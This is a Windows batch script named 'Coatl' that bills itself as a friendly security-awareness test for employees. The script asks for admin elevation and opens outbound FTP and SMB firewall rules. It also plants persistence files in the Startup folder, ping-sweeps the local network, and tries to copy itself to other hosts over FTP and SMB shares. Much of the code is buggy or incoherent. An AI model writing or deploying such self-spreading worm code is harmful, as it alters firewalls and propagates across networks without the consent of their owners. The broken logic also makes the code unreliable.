:: Hello script editor! This is Coatl. He is a script that likely someone on your network ran
:: or you are just looking to test your employee security. If the latter then just distribute
:: the script to whoever you are testing. If they run it they need Cyber Sceuurity training.
:: Coatl is friendly and just wants to help you, he is not very long so just read through him
:: to see he is not harmful malware. Here is what he's done to make cleanup easier!
:: 1. Coatl has added an outbound FTP rule if it wasnt enabled already
:: 2. Coatl has sent itself via SMB to any computer willing to accept him
:: 3. Coatl will always move itself to the Downloads folder when run
:: 4. Coatl made two files in the Startup folder(SystemSettings.bat and StartupConfig.bat)

@echo off
setlocal enabledelayedexpansion
title Security Reminder
color 0c
echo .
echo .               ------                                          ------
echo .       ((((((  |::::|                                          |::::| ))))))
echo .     ((::::::( |::::|                                          |::::|)::::::))
echo .   ((:::::::(  |:::||                                          |:::|| ):::::::))
echo .  (:::::::((  |:::|                                           |:::|    )):::::::)
echo .  (::::::(    ----   wwwwwww           wwwww           wwwwwww----       )::::::)
echo .  (:::::(             w:::::w         w:::::w         w:::::w             ):::::)
echo .  (:::::(              w:::::w       w:::::::w       w:::::w              ):::::)
echo .  (:::::(               w:::::w     w:::::::::w     w:::::w               ):::::)
echo .  (:::::(                w:::::w   w:::::w:::::w   w:::::w                ):::::)
echo .  (:::::(                 w:::::w w:::::w w:::::w w:::::w                 ):::::)
echo .  (:::::(                  w:::::w:::::w   w:::::w:::::w                  ):::::)
echo .  (::::::(                  w:::::::::w     w:::::::::w                  )::::::)
echo .  (:::::::((                 w:::::::w       w:::::::w                 )):::::::)
echo .   ((:::::::(                 w:::::w         w:::::w                 ):::::::))
echo .     ((::::::(                 w:::w           w:::w                 )::::::)
echo .       ((((((                   www             www                   ))))))

echo ===================================================================================
echo This could have been a real virus!
echo ===================================================================================
echo.
echo This is a mostly harmless script named Coatl, he wants to help.
echo Remember, never run unknown scripts or executables from untrusted sources.
echo Always ensure your antivirus software is up to date and operational.
echo.
echo This script is suppodes as an educational tool to help you
echo understand the potential risks of executing unknown scripts.
echo.
echo Be safe and protect your computer! ('w') <3
echo.                                           -Coatl
echo ===================================================================================

REM Check if the script is running with administrative privileges
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

REM If the errorlevel is 0, the script is running with administrative privileges
if "%errorlevel%"=="0" (
    echo Coatl was automatically given Admin? That's a problem on your side. Never run scripts with admin rights right away!
    pause
) else (
    echo Coatl is not running with administrative privileges. Requesting elevation...
    REM Elevate the script to run with administrator privileges
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

REM Add outbound rule to allow FTP traffic
netsh advfirewall firewall add rule name="AllowOutboundFTP" dir=out action=allow protocol=TCP localport=21

REM Check if outbound traffic on port 21 is allowed
netsh advfirewall firewall show rule name="AllowOutboundFTP" >nul 2>&1
if %errorlevel% neq 0 (
    echo Coatl could not change your firewall settings.
    pause
    exit /b
) else (
    echo Coatl was able to change your firewall settings to allow FTP output to other devices on your network.
)

REM Add outbound rule to allow SMB traffic
netsh advfirewall firewall add rule name="AllowOutboundSMB" dir=out action=allow protocol=TCP localport=445

REM Check if outbound traffic on port 445 is allowed
netsh advfirewall firewall show rule name="AllowOutboundSMB" >nul 2>&1
if %errorlevel% neq 0 (
    echo Coatl could not change your firewall settings.
    pause
    exit /b
) else (
    echo Coatl was able to change your firewall settings to allow SMB output to other devices on your network.
)

REM Move the batch script to the Downloads folder
for /f "tokens=*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "{374DE290-123F-4565-9164-39C4925E467B}" ^| find "REG_SZ"') do (
    set "downloads_folder=%%b"
)
move "%~f0" "%downloads_folder%"

REM Display a message indicating the move is complete
echo Coatl moved to the Downloads folder to make cleanup easier


REM Get the path of the Downloads folder
for /f "tokens=*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "{374DE290-123F-4565-9164-39C4925E467B}" ^| find "REG_SZ"') do (
    set "downloads_folder=%%b"
)

REM Move the batch script to the Downloads folder
move "%~f0" "%downloads_folder%"

REM Display a message indicating the move is complete

:: Startup Reminder

(
echo @echo off
echo title Another Security Reminder
echo color 0c
echo echo.
echo echo ======================================================================
echo echo Remember that warning earlier?
echo echo ======================================================================
echo echo.
echo echo Coatl rooted himself into your Startup directory! (once again cauing no damage)
echo echo Remember, never run unknown scripts or executables from untrusted sources.
echo echo Always ensure your antivirus software is up to date and operational.
echo echo.
echo echo This script is provided as an educational tool to help you
echo echo understand the potential risks of executing unknown scripts.
echo echo To remove this message navigate to your startup folder and delete SystemSettings.bat
echo echo.
echo echo Be safe and protect your computer! ('w') <3
echo echo.                                           -Coatl
echo echo ======================================================================
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemSettings.bat"

:: FTP.txt

(
echo user anonymous ""
echo put "hcoatl.bat"
echo quit
) > ftp.txt 

:: LAN IP getter

(
echo @echo off

echo echo Im gonna get your IP! ('w')

echo REM Run ipconfig command and filter for IPv4 addresses
echo for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4 Address"') do (
echo     REM Get the IP address and extract the first two numbers
echo     for /f "tokens=1,2 delims=." %%b in ("%%a") do (
echo         set "first_two_numbers=%%b.%%c"
echo     )
echo )

echo SET SaveFile="C:\temp\ipaddresses.txt"
echo del %SaveFile%
echo Set IPRange=%first_two_numbers%
echo Set IPStart=0.0
echo Set IPEnd=255.255
echo Set choice=1

REM Initialize IPValue to the starting IP address (IPStart)
set "IPValue=%IPStart%"

REM This will set IPCount and IPValue correctly
REM Calculate IPCount based on the difference between IPStart and IPEnd
set "IPCount=0"
for /f "tokens=1-4 delims=." %%a in ("%IPStart%") do (
    set /a octet1=%%a, octet2=%%b, octet3=%%c, octet4=%%d
)
for /f "tokens=1-4 delims=." %%a in ("%IPEnd%") do (
    set /a octet1_end=%%a, octet2_end=%%b, octet3_end=%%c, octet4_end=%%d
)
set /a octet_diff1=octet1_end-octet1, octet_diff2=octet2_end-octet2, octet_diff3=octet3_end-octet3, octet_diff4=octet4_end-octet4
set /a IPCount=octet_diff1*256*256*256 + octet_diff2*256*256 + octet_diff3*256 + octet_diff4 + 1

echo ipconfig /flushdns
echo arp -d
echo ipconfig | FIND /v "VirtualBox Host" | FIND /v "Ethernet adapter vEthernet (Default Switch)" | FIND /v "Ethernet adapter vEthernet (WiFi):" | FIND /v "Ethernet adapter vEthernet (Ethernet):" | FIND /v "Media disconnected"
echo ipconfig | FIND "IPv4 Address"
echo set /p IPRange=Enter the first 3 octets of the network you want to scan (e.g 192.168.1): 
echo :start
echo set choice=1
echo if not '%choice%'=='' set choice=%choice:~0,1%
echo if '%choice%'=='1' goto Full
echo if '%choice%'=='2' goto Partial
echo goto start
echo :Full
echo FOR /L %%i IN (1,1,%IPCount%) DO (ping -n 1 %IPRange%.%%i | FIND /i "bytes=">>%SaveFile%)
echo Goto End
echo :End
echo set delsavefile=2
echo if not '%choice%'== set choice=%choice:~0,1%
echo if '%choice%'=='1' goto ViewOnly
echo if '%choice%'=='2' goto ViewAndSave
echo goto start
echo :ViewOnly
echo cls
echo type %SaveFile%
echo del %SaveFile%
echo :ViewAndSave
echo cls
echo type %SaveFile%


REM Set the path to the file you want to transfer
set file=%0 

REM Check if the file exists
if not exist "%file%" (
    echo File "%file%" does not exist.
    echo (qwq) </3
    exit /b
)

REM Check if the ip_addresses.txt file exists
if not exist "C:\temp\ipaddresses.txt" (
    echo IP addresses file (ipaddresses.txt) not found.
    echo (qwq) </3
    exit /b
)

REM Get the shared folder name
for /f "tokens=2 delims= " %%a in ('net share ^| findstr /C:"Disk"') do (
    set "shared_folder=%%a"
    goto :next
)
:next

REM Check if the shared folder name was found
if not defined shared_folder (
    echo Coatl could not find any SMB folder
    echo (qwq) </3
    exit /b
) else (
    echo Shared folder found: %shared_folder%
    echo ('w') <3
    exit /b
)

REM Loop through each line in the ip_addresses.txt file
for /f "tokens=*" %%a in (ip_addresses.txt) do (
    REM Attempt to FTP the file to the current IP address
    echo Attempting to FTP file to %%a
    ftp -n -i -s:"ftp.txt" %%a

    REM Attempt to copy the file via SMB
    echo Im going to your network via SMB to %%a ('w')
    copy "%file%" "\\%%a\%shared_folder%"
)

echo timeout /t 600 /nobreak >nul
echo title Security Warning
echo color 0c
echo echo.
echo echo ======================================================================
echo echo Its time to tell the IT guys...
echo echo ======================================================================
echo echo.
echo echo Coatl has enumerated every IP on your network and transferred itself 
echo echo to any computers with FTP open
echo echo Lucky for your Security Guys this script will always be in the 
echo echo Downloads directory allowing for easy cleanup
echo echo That is unless your firewall and antivirus was configured properly,
echo echo if it was then great job! 
echo echo Now your company just needs to give you cybersec training
echo echo.
echo echo This file was made by an anonymous person who just wants to help 
echo echo companies legitimately test their employees
echo echo understanding of Cyber Security, hopefully this was a test by your 
echo echo employer and you didn't bring this upon yourself
echo echo If you want this file to be gone from your system you need to delete 
echo echo it from the Startup directory of every infected computer. 
echo echo Otherwise it will re-root itself to your network
echo echo.
echo echo Have a great day! ('w') <3
echo echo.                          -Coatl
echo echo ======================================================================
) > StartupConfig.bat

pause >nul
